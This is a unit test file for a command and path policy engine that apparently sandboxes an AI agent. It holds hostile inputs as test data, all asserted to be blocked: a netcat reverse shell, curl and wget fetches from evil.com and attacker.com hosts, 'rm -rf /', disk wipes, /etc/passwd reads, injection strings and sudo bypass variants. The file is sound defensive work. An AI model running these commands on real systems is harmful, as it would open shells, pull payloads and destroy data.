import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { PolicyEngine } from '../dist/components/policy-engine.js';

describe('PolicyEngine Unit Tests', () => {
  const policy = new PolicyEngine();
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gelada-policy-test-'));
  });

  afterEach(() => {
    if (tmpDir && fs.existsSync(tmpDir)) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  describe('1. evaluateAction', () => {
    it('should allow default registered tool actions', () => {
      const actions = ['delegate_task', 'revise_task', 'inspect_task', 'discard_task', 'doctor'];
      for (const act of actions) {
        const decision = policy.evaluateAction(act);
        assert.equal(decision.allowed, true, `Action ${act} should be allowed`);
      }
    });

    it('should normalize whitespace and casing in action names', () => {
      const d1 = policy.evaluateAction('  DELEGATE_TASK  ');
      assert.equal(d1.allowed, true);

      const d2 = policy.evaluateAction('Doctor');
      assert.equal(d2.allowed, true);
    });

    it('should reject invalid action names (empty, null, non-string)', () => {
      assert.equal(policy.evaluateAction('').allowed, false);
      assert.equal(policy.evaluateAction(null).allowed, false);
      assert.equal(policy.evaluateAction(123).allowed, false);
    });

    it('should reject actions when context.restricted is true', () => {
      const decision = policy.evaluateAction('delegate_task', { restricted: true });
      assert.equal(decision.allowed, false);
      assert.ok(decision.reason.includes('restricted context flag'));
    });

    it('should reject actions not in allowedActions set', () => {
      const decision = policy.evaluateAction('unregistered_action');
      assert.equal(decision.allowed, false);
      assert.equal(decision.code, 'ACTION_NOT_ALLOWED');
    });
  });

  describe('2. Path Security & Boundaries (isPathAllowed & validatePathAccess)', () => {
    it('should allow safe relative paths within working directory', () => {
      assert.equal(policy.isPathAllowed('src/components/policy-engine.ts', tmpDir), true);
      assert.equal(policy.isPathAllowed('package.json', tmpDir), true);
      assert.equal(policy.isPathAllowed('tests/test.js', tmpDir), true);
    });

    it('should reject relative path traversal sequences containing ".."', () => {
      assert.equal(policy.isPathAllowed('../secret.txt', tmpDir), false);
      assert.equal(policy.isPathAllowed('src/../../etc/passwd', tmpDir), false);
      assert.equal(policy.isPathAllowed('./foo/../bar/..', tmpDir), false);

      const res = policy.validatePathAccess('../secret.txt', tmpDir);
      assert.equal(res.allowed, false);
      assert.equal(res.code, 'PATH_TRAVERSAL');
    });

    it('should reject absolute paths escaping the working directory', () => {
      assert.equal(policy.isPathAllowed('/etc/passwd', tmpDir), false);
      assert.equal(policy.isPathAllowed('/var/log/syslog', tmpDir), false);
      assert.equal(policy.isPathAllowed('/root/.ssh/id_rsa', tmpDir), false);

      const res = policy.validatePathAccess('/etc/passwd', tmpDir);
      assert.equal(res.allowed, false);
      assert.equal(res.code, 'PATH_TRAVERSAL');
    });

    it('should reject subpath prefix collisions (e.g. workspace-secret vs workspace)', () => {
      const baseDir = path.join(tmpDir, 'workspace');
      fs.mkdirSync(baseDir, { recursive: true });

      const siblingDir = path.join(tmpDir, 'workspace-secret');
      fs.mkdirSync(siblingDir, { recursive: true });

      const res = policy.validatePathAccess(siblingDir, baseDir);
      assert.equal(res.allowed, false);
    });

    it('should reject access to protected files and directories (.git, .env)', () => {
      assert.equal(policy.isPathAllowed('.git/hooks/pre-commit', tmpDir), false);
      assert.equal(policy.isPathAllowed('.git/config', tmpDir), false);
      assert.equal(policy.isPathAllowed('.env', tmpDir), false);
      assert.equal(policy.isPathAllowed('.env.local', tmpDir), false);

      const resGit = policy.validatePathAccess('.git/hooks', tmpDir);
      assert.equal(resGit.allowed, false);
      assert.equal(resGit.code, 'PROTECTED_PATH');
    });

    it('should detect symlink escapes pointing outside workspace', () => {
      const targetDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gelada-symlink-target-'));
      const symlinkPath = path.join(tmpDir, 'external_link');

      try {
        fs.symlinkSync(targetDir, symlinkPath, 'dir');
        const res = policy.validatePathAccess('external_link/file.txt', tmpDir);
        assert.equal(res.allowed, false);
        assert.equal(res.code, 'SYMLINK_ESCAPE');
      } finally {
        fs.rmSync(targetDir, { recursive: true, force: true });
      }
    });

    it('should reject non-string, empty, or null-byte paths', () => {
      assert.equal(policy.isPathAllowed('', tmpDir), false);
      assert.equal(policy.isPathAllowed(null, tmpDir), false);
      assert.equal(policy.isPathAllowed('src/foo\0bar.ts', tmpDir), false);
    });
  });

  describe('3. validatePathScope', () => {
    it('should validate valid allowedPaths within working directory', () => {
      const res = policy.validatePathScope(['src/index.ts', 'tests/'], undefined, tmpDir);
      assert.equal(res.allowed, true);
    });

    it('should reject allowedPaths containing path traversal or invalid paths', () => {
      const res = policy.validatePathScope(['src/index.ts', '../secret.txt'], undefined, tmpDir);
      assert.equal(res.allowed, false);
      assert.equal(res.code, 'PATH_TRAVERSAL');
    });

    it('should reject disallowedPaths with invalid items', () => {
      const res = policy.validatePathScope(undefined, ['\0badPath'], tmpDir);
      assert.equal(res.allowed, false);
      assert.equal(res.code, 'INVALID_PATH');
    });
  });

  describe('4. validateVerificationCommand & validateVerificationCommands', () => {
    it('should allow standard build and test verification runners', () => {
      const safeCommands = [
        'npm test',
        'npx vitest run',
        'jest --coverage',
        'cargo test',
        'pytest tests/',
        'go test ./...',
        'make test',
        'node scripts/verify.js',
      ];

      for (const cmd of safeCommands) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, true, `Command '${cmd}' should be allowed`);
      }
    });

    it('should block destructive system executables (sudo, rm, mkfs, dd, shutdown, etc.)', () => {
      const forbiddenExecutables = [
        'sudo apt install foo',
        'su - root',
        'mkfs.ext4 /dev/sdb',
        'dd if=/dev/zero of=/dev/sda',
        'shutdown -h now',
        'reboot',
        'userdel -r admin',
      ];

      for (const cmd of forbiddenExecutables) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Command '${cmd}' should be blocked`);
        assert.equal(res.code, 'FORBIDDEN_EXECUTABLE');
      }
    });

    it('should block destructive patterns (rm -rf /, chmod 777)', () => {
      const destructivePatterns = [
        'rm -rf /',
        'rm -rf ~',
        'rm -rf *',
        'rm -rf .',
        'chmod -R 777 .',
        'cat /etc/passwd > /etc/shadow',
      ];

      for (const cmd of destructivePatterns) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Command '${cmd}' should be blocked as destructive`);
      }
    });

    it('should block subshell injection and command substitution ($(...), `...`)', () => {
      const subshellCommands = [
        'echo $(whoami)',
        'node -e `cat /etc/passwd`',
        'eval "echo hello"',
      ];

      for (const cmd of subshellCommands) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Subshell command '${cmd}' should be blocked`);
      }
    });

    it('should block restricted network calls by default (curl, wget, ssh, nc)', () => {
      const netCommands = [
        'curl -s https://evil.com/script.sh',
        'wget http://attacker.com/malware',
        'nc -e /bin/sh 10.0.0.1 4444',
        'ssh user@remote.com',
      ];

      for (const cmd of netCommands) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Network command '${cmd}' should be blocked`);
        assert.equal(res.code, 'NETWORK_RESTRICTED');
      }
    });

    it('should allow network calls when context.allowNetwork is true', () => {
      const res = policy.validateVerificationCommand('curl -s http://localhost:8080/health', {
        allowNetwork: true,
      });
      assert.equal(res.allowed, true);
    });

    it('should block shell chaining operators by default (;, &&, ||)', () => {
      const chainCommands = [
        'npm test ; rm -rf /',
        'node index.js && cat /etc/passwd',
        'pytest || echo failed',
      ];

      for (const cmd of chainCommands) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Chained command '${cmd}' should be blocked`);
        assert.equal(res.code, 'SHELL_CHAINING_RESTRICTED');
      }
    });

    it('should allow shell chaining when context.allowShellChaining is true', () => {
      const res = policy.validateVerificationCommand('npm run build && npm test', {
        allowShellChaining: true,
      });
      assert.equal(res.allowed, true);
    });

    it('validateVerificationCommands should validate array of verification commands', () => {
      const validSuite = ['npm run build', 'npm test'];
      assert.equal(policy.validateVerificationCommands(validSuite).allowed, true);

      const invalidSuite = ['npm test', 'rm -rf /'];
      const res = policy.validateVerificationCommands(invalidSuite);
      assert.equal(res.allowed, false);
    });

    it('should reject invalid or null-byte commands', () => {
      assert.equal(policy.validateVerificationCommand('').allowed, false);
      assert.equal(policy.validateVerificationCommand(null).allowed, false);
      assert.equal(policy.validateVerificationCommand('npm test\0injection').allowed, false);
    });
  });

  describe('5. Security Vulnerability Remediation Probes (M7 Bypasses)', () => {
    it('1. should block executable blocklist path bypasses (/usr/bin/sudo, ENV=1 sudo, quotes, escapes)', () => {
      const bypasses = [
        '/usr/bin/sudo apt install foo',
        'ENV=1 /usr/bin/sudo',
        '"/usr/bin/sudo" -u root',
        '\\sudo -i',
        'FOO=bar /usr/bin/sudo rm -rf /',
      ];
      for (const cmd of bypasses) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Bypass command '${cmd}' should be blocked`);
        assert.equal(res.code, 'FORBIDDEN_EXECUTABLE');
      }
    });

    it('2. should block broken symlink escape bypasses', () => {
      const brokenOutsideLink = path.join(tmpDir, 'broken_outside_link');
      const nonExistentOutside = path.join(os.tmpdir(), 'gelada-nonexistent-outside-target-12345', 'sub');
      fs.symlinkSync(nonExistentOutside, brokenOutsideLink);

      const res = policy.validatePathAccess('broken_outside_link', tmpDir);
      assert.equal(res.allowed, false);
      assert.equal(res.code, 'SYMLINK_ESCAPE');
    });

    it('3. should block nested protected environment files (config/.env.production)', () => {
      const nestedEnvPaths = [
        'config/.env.production',
        'nested/dir/.env.local',
        'app/settings/.env',
      ];
      for (const p of nestedEnvPaths) {
        const res = policy.validatePathAccess(p, tmpDir);
        assert.equal(res.allowed, false, `Nested env path '${p}' should be blocked`);
        assert.equal(res.code, 'PROTECTED_PATH');
      }
    });

    it('4. should block multi-command newline and backgrounding injections', () => {
      const injectionCmds = [
        'npm test\nwhoami',
        'npm test\r\nwhoami',
        'npm test &',
        'npm test && whoami',
        'npm test ; whoami',
        'npm test | whoami',
      ];
      for (const cmd of injectionCmds) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Injection command '${cmd.replace(/\n/g, '\\n').replace(/\r/g, '\\r')}' should be blocked`);
        assert.equal(res.code, 'SHELL_CHAINING_RESTRICTED');
      }
    });

    it('5. should block network restriction bypasses with path-qualified tools (/usr/bin/curl)', () => {
      const netBypasses = [
        '/usr/bin/curl -s https://evil.com',
        'ENV=1 /usr/local/bin/wget http://evil.com',
        '"curl" https://evil.com',
        '\\curl https://evil.com',
      ];
      for (const cmd of netBypasses) {
        const res = policy.validateVerificationCommand(cmd);
        assert.equal(res.allowed, false, `Network bypass command '${cmd}' should be blocked`);
        assert.equal(res.code, 'NETWORK_RESTRICTED');
      }
    });

    it('6. should reject whitespace-only paths', () => {
      const whitespacePaths = ['   ', '\t', '  \n  '];
      for (const p of whitespacePaths) {
        const res = policy.validatePathAccess(p, tmpDir);
        assert.equal(res.allowed, false, `Whitespace path should be rejected`);
        assert.equal(res.code, 'INVALID_PATH');
        assert.equal(policy.isPathAllowed(p, tmpDir), false);
      }
    });
  });
});

